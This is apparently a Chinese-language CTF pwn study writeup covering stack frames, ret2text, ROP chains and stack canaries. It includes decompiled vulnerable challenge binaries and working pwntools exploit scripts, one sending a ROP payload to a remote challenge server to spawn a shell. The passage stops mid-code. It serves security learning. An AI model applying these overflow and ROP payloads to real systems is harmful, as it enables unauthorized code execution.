<h2 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h2><p>和Reverse一样,要先查壳…<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=文件地址</span><br></pre></td></tr></table></figure><br>在windows下安装了pwntools之后自带checksec(能检查elf的),大可不必用虚拟机或wsl.<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwn checksec xxxx</span><br></pre></td></tr></table></figure></p>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="task1-2"><a href="#task1-2" class="headerlink" title="task1"></a>task1</h3><p>我们小学二年级就知道，使用栈的结构来保存函数的嵌套调用关系是很方便的。</p>
<p>简单来说，栈就是一个可读写的数据段，程序可以通过push或pop指令压栈或弹栈，也即在栈上保存一个值或者弹出一个值到寄存器/内存单元。栈的增长方向是朝向低地址的，也就是说压栈的时候栈指针（如 x86-64 架构中的rsp）总是减小。</p>
<p>现在有一个过程f1，f1所有的非静态局部变量都可以放在栈上的一个指定区域内，简单地来说，这个区域被称作f1的栈帧。为了方便起见，我们需要用一个寄存器记录下当前栈帧最底部的地址（栈帧的基址），然后用一个固定的偏移去访问f1的非静态局部变量。</p>
<p>f1内嵌套调用f2时，我们将f1的栈帧基址与下一条指令的地址保存在f2栈帧的底部。<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">^ Low (Towards which</span><br><span class="line">|      stack grows)</span><br><span class="line">| </span><br><span class="line">|  +------------+</span><br><span class="line">|  |  f2_frame  |</span><br><span class="line">|  |   f1_bp    | &lt;- f2_bp</span><br><span class="line">|  | f1_retaddr |</span><br><span class="line">|  +------------+</span><br><span class="line">|  |  f1_frame  |</span><br><span class="line">|  |   ??_bp    | &lt;- f1_bp</span><br><span class="line">|  | ??_retaddr |</span><br><span class="line">|  +------------+</span><br><span class="line">| </span><br><span class="line">v High</span><br></pre></td></tr></table></figure><br>返回时，先从f2_bp处保存的f1_bp恢复f1的栈帧基址，再根据f1_retaddr的值返回到f1中调用f2时的下一条指令处。这样我们就从f2成功返回到了f1。</p>
<p>以我们熟知的 x86-64 架构为例，一般来说，通过call操作从f1进入f2时，处理器先将f1中下一条指令的地址压栈，进入到f2，然后f2在入口（prologue）处布置好自己的栈帧，<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">endbr64    ; 在处理器未开启CET时相当于空操作</span><br><span class="line">push rbp    ; 保存 f1 的栈帧</span><br><span class="line">mov rbp, rsp    ; 设置 f2 栈帧的基址</span><br><span class="line">sub rsp, xx    ; 在栈中“开辟”一段大小为 xx 的</span><br><span class="line">                 空间，用来管理非静态局部变量</span><br><span class="line">; …</span><br></pre></td></tr></table></figure><br>然后在出口（epilogue）处清理自己的栈帧并返回到f1，<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">; …</span><br><span class="line">mov rsp, rbp    ; 经常与下面一条合并为 leave</span><br><span class="line">pop rbp    ; 返回到 f1 的栈帧</span><br><span class="line">ret xxx    ; 返回到 rsp 指向的地址，也即</span><br><span class="line">             f1 中 call 的下一条指令处，</span><br><span class="line">             被调用者清栈时会指定xxx的值</span><br></pre></td></tr></table></figure><br>如果没有需要用到栈的局部变量，那sub rsp, xx、leave都会省略。</p>
<p>在本题中有一个大小为100字节的buf变量，由于 x86-64 ABI 希望在执行call之前、布置栈帧之后的rsp是16字节对齐的，我们需要“开辟”一个112字节（100向上对齐到16的倍数）大小的栈空间用来存放buf，然后main函数便可以通过rbp-112来访问buf了。</p>
<p>众所周知，scanf(“%s”, buf);读到回车符（\n）才会停止读取输入，但并不会限制读入字符的数量，因此你可以从rbp-112一直连续写入到后面很远的地方。根据上文所述，你完全可以控制main返回时跳转到的地址。</p>
<p>backdoor过程中有一个system(“/bin/sh”);，意思是给你一个shell，这样你就可以通过shell命令控制操作系统干很多事情了，包括但不限于读写文件系统，而Flag正是保存在文件系统中的。</p>
<p>你可以采取如下的策略：</p>
<p>注：本题未开启canary与PIE，前者会阻止你简单地篡改旧栈帧基址与返回地址，而后者会随机化backdoor乃至整个程序的地址，你很难在不知道随机化后程序代码段基址的情况下控制程序跳转到相应的地址。<br>基址随机化是ASLR导致的</p>
<p>注：记得在调用system前保证rsp是16字节对齐的，system过程涉及一条指令movaps xmmword ptr [rsp], xmm1，此时的rsp若不是16字节对齐的便会触发段错误导致程序崩溃，这也是 x86-64 ABI 要求rsp对齐的原因之一（简化对齐的判定）。直接劫持返回地址到backdoor后的rsp一定不是对齐的（缺少call指令的一次压栈），你可以先跳到一个ret指令上让处理器多弹一次栈，然后再跳到backdoor（自己想想怎么布置栈上的内容），也可以直接跳转到backdoor开头的第一个push/pop指令后，因为64位下每次压栈/弹栈操作都会让rsp减少/增加8。</p>
<p>注意2:你要关注的是rbp的地址,体现在程序中是这里:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line">  _BYTE v5[<span class="number">64</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line"><span class="comment">/*                            ^^^^^^^               */</span></span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;-Warm Up-\n&quot;</span>, <span class="number">0xA</span>uLL);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;WOW:&quot;</span>, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%p\n&quot;</span>, system_);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, s, <span class="number">9uLL</span>);</span><br><span class="line">  <span class="built_in">write</span>(<span class="number">1</span>, <span class="string">&quot;&gt;&quot;</span>, <span class="number">1uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">gets</span>(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这也就是为什么你要构造0x40的payload.  </p>
<h3 id="这个题的答案…"><a href="#这个题的答案…" class="headerlink" title="这个题的答案…"></a>这个题的答案…</h3><p>首先构造112个字节填满缓存区.<br>然后随便构造8个字节填满bp(已经不需要回去了,bp也没用了)<br>然后找到基址:0x400000<br>backdoor地址:0x004011db(已经加上基址)<br>retn的地址:0x004011Da<br>答案:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + p64(ret_addr) + p64(backdoor_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>
<h3 id="更广泛地…"><a href="#更广泛地…" class="headerlink" title="更广泛地…"></a>更广泛地…</h3><p>据说这个题有两个做法,第一是覆盖满整个frame之后额外+8覆盖bp然后随便找一个ret取地址,然后加上后门地址,设frame大小为n,payload长这样:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay=<span class="string">b&#x27;A&#x27;</span>*(n+<span class="number">8</span>)+p64(ret_addr)+p64(backdoor_addr)</span><br></pre></td></tr></table></figure><br>还有个更省事的办法,直接把后门函数正常进入的那个压栈函数略过,在+8盖住bp之后用后门函数地址覆盖ret地址,直接执行后面的内容,也可以做到:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pay=<span class="string">b&#x27;A&#x27;</span>*(n+<span class="number">8</span>)+p64(backdoor_addr)</span><br></pre></td></tr></table></figure></p>
<h3 id="task2-2"><a href="#task2-2" class="headerlink" title="task2"></a>task2</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">()</span></span>&#123;</span><br><span class="line">  _BYTE v1[<span class="number">44</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">float</span> v2; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"><span class="comment">/*                        ^^^^^^                  */</span></span><br><span class="line">  v2 = <span class="number">0.0</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s guess the number.&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(v1);</span><br><span class="line">  <span class="keyword">if</span> ( v2 == <span class="number">11.28125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">system</span>(<span class="string">&quot;cat /flag&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Its value should be 11.28125&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个题中我们需要构造v1去覆盖v2,还是往rbp的方向去覆盖即可(44+payload).  </p>
<h3 id="task3-1"><a href="#task3-1" class="headerlink" title="task3"></a>task3</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">vuln</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *src; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [esp+4h] [ebp-54h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+8h] [ebp-50h]</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+1Ch] [ebp-3Ch] BYREF</span></span><br><span class="line">  _BYTE v6[<span class="number">4</span>]; <span class="comment">// [esp+3Ch] [ebp-1Ch] BYREF</span></span><br><span class="line">  _BYTE v7[<span class="number">7</span>]; <span class="comment">// [esp+40h] [ebp-18h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+47h] [ebp-11h] BYREF</span></span><br><span class="line">  _BYTE v9[<span class="number">7</span>]; <span class="comment">// [esp+48h] [ebp-10h] BYREF</span></span><br><span class="line">  _BYTE v10[<span class="number">5</span>]; <span class="comment">// [esp+4Fh] [ebp-9h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Tell me something about yourself: &quot;</span>);</span><br><span class="line">  <span class="built_in">fgets</span>(s, <span class="number">32</span>, edata);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, s);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(&amp;v8);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v7, <span class="string">&quot;you&quot;</span>, &amp;v8);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::<span class="built_in">allocator</span>(v10);</span><br><span class="line">  std::string::<span class="built_in">string</span>(v9, <span class="string">&quot;I&quot;</span>, v10);</span><br><span class="line">  <span class="built_in">replace</span>((std::string *)v6, (std::string *)&amp;input, (std::string *)v9);</span><br><span class="line">  std::string::<span class="keyword">operator</span>=(&amp;input, v6, v4);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v6);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v9);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(v10, v2);</span><br><span class="line">  std::string::~<span class="built_in">string</span>(v7);</span><br><span class="line">  std::allocator&lt;<span class="type">char</span>&gt;::~<span class="built_in">allocator</span>(&amp;v8, v3);</span><br><span class="line">  src = (<span class="type">const</span> <span class="type">char</span> *)std::string::<span class="built_in">c_str</span>((std::string *)&amp;input);</span><br><span class="line">  <span class="built_in">strcpy</span>(s, src);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;So, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>fgets要安全一点,因为他只要前32个输入,这会造成麻烦.别跑,后面这一长串还有东西的:<br>审计代码发现后面的字符串把I换成you,最后的地址还是s,所以可以栈溢出攻击. <code>pay=b&#39;I&#39;*(20)+b&#39;A&#39;*(4)+p64(tar)</code>  </p>
<h3 id="task4"><a href="#task4" class="headerlink" title="task4"></a>task4</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">get_flag</span><span class="params">(<span class="type">int</span> n814536271, <span class="type">int</span> n425138641)</span></span>&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 n255_2; <span class="comment">// al</span></span><br><span class="line">  <span class="type">int</span> n255; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 n255_1; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">if</span> ( n814536271 == <span class="number">814536271</span> &amp;&amp; n425138641 == <span class="number">425138641</span> )&#123;</span><br><span class="line">    v2 = <span class="built_in">fopen</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rt&quot;</span>);</span><br><span class="line">    n255_2 = <span class="built_in">getc</span>(v2);</span><br><span class="line">    <span class="keyword">if</span> ( n255_2 != <span class="number">255</span> )&#123;</span><br><span class="line">      n255 = (<span class="type">char</span>)n255_2;</span><br><span class="line">      <span class="keyword">do</span>&#123;</span><br><span class="line">        <span class="built_in">putchar</span>(n255);</span><br><span class="line">        n255_1 = <span class="built_in">getc</span>(v2);</span><br><span class="line">        n255 = (<span class="type">char</span>)n255_1;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( n255_1 != <span class="number">255</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(v2);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span>&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">56</span>]; <span class="comment">// [esp+4h] [ebp-38h] BYREF</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Qual a palavrinha magica? &quot;</span>, v4[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">gets</span>(v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个程序要求正常跳到get_flag函数,但是其函数要求整个程序正常返回,同时还有两个额外参数要传.<br>这个时候应该是 <code>pay=fill+p32(get_flag)+p32(exit)+p32(参数1)+p32(参数2)</code><br>也就是说,参数传递在后面,依次传递.</p>
<h2 id="ROP链"><a href="#ROP链" class="headerlink" title="ROP链"></a>ROP链</h2><p>栈溢出,传递参数,获取sh,一条龙.</p>
<h3 id="task1-3"><a href="#task1-3" class="headerlink" title="task1"></a>task1</h3><p>我们在 <code>Pwn &gt; 1 - 胎息 &gt; ret2text</code> 中已经知道函数栈帧的结构，也知道如何通过篡改返回地址来劫持程序的执行流。<br>由于一些例程在刚被调用时会对一些通用寄存器进行压栈，最后在将要返回时逆序弹出这些寄存器的保存值，以使调用前后这些寄存器的值仍然保持一致，比如<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">endbr64</span><br><span class="line">push r15</span><br><span class="line">push rdi</span><br><span class="line">; ...</span><br><span class="line">pop rdi</span><br><span class="line">pop r15</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><br>因此这些例程的结尾存在形如pop - ret的指令序列。<br>假设某时刻程序将要执行ret以返回，栈顶保存的地址指向这样的一串指令：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line">ret</span><br><span class="line">; ...</span><br></pre></td></tr></table></figure></p>
<p>那么不难发现，执行完这两条指令后，我们的rdi寄存器的内容变成了rsp+8保存的八字节数据，然后程序通过ret跳转到rsp+16保存的地址。如Pwn &gt; 1 - 胎息 &gt; fmtstr中介绍的那样，默认的调用约定下，rdi保存的恰好是例程的第一个参数。我们从栈顶开始往下写入这样的数据： <code>p64(pop_rdi_ret) + p64(param_1) + p64(func)</code>   </p>
<p>其中pop_rdi_ret是指向pop rdi ; ret指令的地址，那么我们就可以劫持程序执行func(param_1);。这种攻击方法被广泛使用，称作面向返回的编程（Return-Oriented Programming，ROP），像上面那样往栈上写入的数据称为ROP链，而像pop rdi ; ret这样的指令序列被称作gadget（小片段）。<br>你可以通过ROPgadget查找一个ELF程序中可执行的gadget。如下命令用于查找./pwn中只含有pop与ret的可执行gadget。更多用法查看ROPgadget —help。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --only <span class="string">&quot;pop|ret&quot;</span> --binary ./pwn</span><br></pre></td></tr></table></figure><br>你可以通过GDB+Pwndbg来调试ELF程序。安装方法与使用方法从略。<br>你可以通过Pwntools内置的gdb.attach方法附加到一个由Pwntools的process启动的进程上并启动GDB调试会话。为了观察Payload将要生效时进程的详细状态，你需要在Payload被发送前就附加到这个进程上并暂停攻击脚本的执行，比如<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload =    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line">pause()</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><br>现在看这个题的代码:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDIN_FILENO 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDOUT_FILENO 1</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setvbuf</span>(stderr, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">gadget</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="string">&quot;pop rdi\n&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="string">&quot;ret\n&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">	)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> binsh[] = <span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;echo \&quot;Hi~ I&#x27;m Lillian Weinberg!\&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line">	<span class="built_in">read</span>(STDIN_FILENO, buf, <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>答案:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=remote(<span class="string">&#x27;202.198.27.90&#x27;</span>,<span class="number">40163</span>)</span><br><span class="line">pop_rdi = <span class="number">0x4011e3</span>			<span class="comment"># 指定命令 pop rdi ret</span></span><br><span class="line">binsh_addr = <span class="number">0x404040</span>		<span class="comment"># /bin/sh字符串的地址</span></span><br><span class="line">system_addr = <span class="number">0x401060</span>		<span class="comment"># sh后门的地址</span></span><br><span class="line">ret_addr = <span class="number">0x401201</span> 		<span class="comment"># 随便一个ret的地址</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">256</span></span><br><span class="line">payload += <span class="string">b&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(ret_addr)	<span class="comment"># 栈对齐</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<h2 id="Canary-金丝雀"><a href="#Canary-金丝雀" class="headerlink" title="Canary 金丝雀"></a>Canary 金丝雀</h2><p>众所周知，当我们读入的字节数超过了缓冲区的大小时，多出来的部分会覆盖缓冲区尾巴后面的变量。为了缓解这个问题，人们引入了Canary的保护机制，以下引用CTF-Wiki的原文:</p>
<blockquote>
<p>Canary 的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p>
</blockquote>
<p>Canary的保护机制会在编译程序时自动在可能发生溢出的栈帧底部插入一个值（x86-64下是8字节），函数返回之时检测这个值是否发生了改变，以此来判断缓冲区溢出是否发生。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">^ Low (Towards <span class="built_in">which</span></span><br><span class="line">|      stack grows)</span><br><span class="line">| </span><br><span class="line">|  +------------+</span><br><span class="line">|  |   buffer   |</span><br><span class="line">|  |   canary   |</span><br><span class="line">|  |   old_bp   | &lt;- bp</span><br><span class="line">|  |   retaddr  |</span><br><span class="line">|  +------------+</span><br><span class="line">| </span><br><span class="line">v High</span><br></pre></td></tr></table></figure><br>如果缓冲区buffer的尾巴和canary是紧挨着的，并且可以用puts等函数读取缓冲区，那么canary有可能会被连带着一起读出来。因此canary的最低字节被固定为0。<br>checksec的结果中显示Canary found说明程序中存在Canary保护。<br>程序源码:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDIN_FILENO 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STDOUT_FILENO 1</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdin, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setvbuf</span>(stdout, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">setvbuf</span>(stderr, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">backdoor</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">	<span class="built_in">init</span>();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your name: &quot;</span>);</span><br><span class="line">	<span class="built_in">read</span>(STDIN_FILENO, buf, <span 